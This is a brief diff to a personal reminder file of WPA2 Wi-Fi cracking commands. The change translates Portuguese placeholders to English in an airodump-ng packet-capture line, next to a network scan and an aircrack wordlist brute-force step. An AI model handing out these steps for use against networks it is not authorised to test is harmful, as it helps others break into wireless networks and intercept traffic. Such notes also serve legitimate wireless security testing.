@@ -9,7 +9,7 @@ This is a simple file for remind me some wpa2 cracking instructions.
 	sudo airodump-ng <monitor>
 
 ### Pegar pacotes
-	sudo airodump-ng <monitor> -c <canal> --bssid <bssid> -w <nomedoarquivo>
+	sudo airodump-ng <monitor> -c <channel> --bssid <bssid> -w <filename>
 
 ### Bruteforce nos pacotes capturados
 	aircrack -w <wordlist> -b <BSSID> <.CAP>
